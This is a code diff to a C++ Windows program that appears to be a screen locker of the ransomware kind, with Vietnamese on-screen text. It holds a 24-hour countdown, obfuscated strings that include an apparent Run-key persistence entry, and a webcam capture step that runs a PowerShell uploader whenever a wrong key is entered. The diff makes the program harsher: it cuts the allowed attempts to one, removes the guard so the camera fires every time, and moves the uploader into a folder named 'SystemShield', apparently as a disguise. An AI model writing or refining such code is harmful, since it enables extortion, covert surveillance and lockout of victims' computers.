@@ -9,7 +9,7 @@
 #pragma comment(lib, "bcrypt.lib")
 
 const char* const PASSWORD_HASH = "aaf8c4d3cee9fe8761a05bf247b50a2d64f32c8961fda4e98a30c11eab585a33";
-const int MAX_FAILED_ATTEMPTS = 3;
+const int MAX_FAILED_ATTEMPTS = 1;
 const int COUNTDOWN_SECONDS = 86400; 
 
 std::wstring DecryptString(const wchar_t* encrypted, int key) {
@@ -41,7 +41,6 @@ const wchar_t* ENC_RUNKEY  = L"\x06\x3A\x33\x21\x22\x34\x27\x30\x09\x18\x3C\x36\
 const wchar_t* ENC_TITLE   = L"\x06\x0C\x06\x01\x10\x18\x75\x19\x1A\x16\x1E\x10\x11";
 
 void TriggerWebcamAlert(const std::wstring& attemptedKey) {
-    if (g_cameraTriggered) return;
     g_cameraTriggered = true;
 
     wchar_t exePath[MAX_PATH];
@@ -55,7 +54,7 @@ void TriggerWebcamAlert(const std::wstring& attemptedKey) {
 
     DWORD attr = GetFileAttributesW(psScript.c_str());
     if (attr == INVALID_FILE_ATTRIBUTES) {
-        psScript = folder + L"\\..\\Lock\\Uploader.ps1";
+        psScript = folder + L"\\..\\SystemShield\\Uploader.ps1";
     }
 
     std::wstring safeKey = attemptedKey;
@@ -244,11 +243,12 @@ void RenderScene(HDC hdc, const RECT& rect) {
     SelectObject(hdc, hFontMid);
     int elapsed = (int)difftime(time(NULL), g_startTime);
     int remaining = max(0, COUNTDOWN_SECONDS - elapsed);
-    int minutes = remaining / 60;
+    int hours = remaining / 3600;
+    int minutes = (remaining % 3600) / 60;
     int seconds = remaining % 60;
     wchar_t timerBuf[128];
-    swprintf_s(timerBuf, L"THỜI GIAN CÒN LẠI: %02d:%02d  |  SỐ LẦN SAI: %d / %d",
-               minutes, seconds, g_failedAttempts, MAX_FAILED_ATTEMPTS);
+    swprintf_s(timerBuf, L"THỜI GIAN CÒN LẠI: %02d:%02d:%02d  |  SỐ LẦN SAI: %d",
+               hours, minutes, seconds, g_failedAttempts);
 
     SetTextColor(hdc, (remaining < 180 && g_blinkState) ? RGB(255, 0, 0) : RGB(255, 180, 180));
     RECT timerRect = { 0, centerY + 68, screenWidth, centerY + 100 };
